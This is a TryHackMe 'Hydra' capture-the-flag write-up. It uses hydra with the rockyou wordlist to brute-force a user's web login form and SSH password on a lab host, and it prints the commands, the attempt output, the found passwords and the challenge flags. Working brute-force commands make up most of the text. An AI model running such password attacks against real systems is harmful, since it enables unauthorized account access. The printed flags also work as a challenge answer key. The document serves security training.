# Hydra Challenge Writeup
#pentest/tryhackme

Our first task is to try to guess molly’s web password. We try to login and copy the request as curl in our developer tools.

```
curl 'http://10.10.84.187/login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://10.10.84.187/login' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Connection: keep-alive' -H 'Cookie: connect.sid=s%3Ah0ADsDa367RyMolh_Zm5Kxl49AGPXLNZ.yMtt1sPwtyYEA62yz675d6vcr94KxbQZIYD%2BB1Q1LEQ' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'username=foo&password=bar'
```

Things to keep in mind are the param within `—data-raw` and the error message: `Your username or password is incorrect.`

Let’s craft our hydra command:

```shell
$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.84.187 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
...
[ATTEMPT] target 10.10.84.187 - login "molly" - pass "loveme" - 38 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.84.187 - login "molly" - pass "fuckyou" - 39 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.84.187 - login "molly" - pass "123123" - 40 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.84.187 - login "molly" - pass "football" - 41 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.84.187 - login "molly" - pass "secret" - 42 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.84.187 - login "molly" - pass "andrea" - 43 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.84.187 - login "molly" - pass "carlos" - 44 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.84.187 - login "molly" - pass "jennifer" - 45 of 14344399 [child 8] (0/0)
[80][http-post-form] host: 10.10.84.187   login: molly   password: sunshine
```

There we have it! `molly/sunshine`, let’s login!
And we get our flag: `THM{2673a7dd116de68e85c48ec0b1f2612e}`

Next is SSH, we can also craft a similar hydra query:

```shell
$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.84.187 -t 4 ssh
...
[DATA] attacking ssh://10.10.84.187:22/
[22][ssh] host: 10.10.84.187   login: molly   password: butterfly
```

And again, after connecting through SSH we get our flag.

```shell
kali@kali:~/local_server$ ssh molly@10.10.84.187
...
molly@ip-10-10-84-187:~$ ls
flag2.txt
molly@ip-10-10-84-187:~$ cat flag2.txt 
THM{c8eeb0468febbadea859baeb33b2541b}
```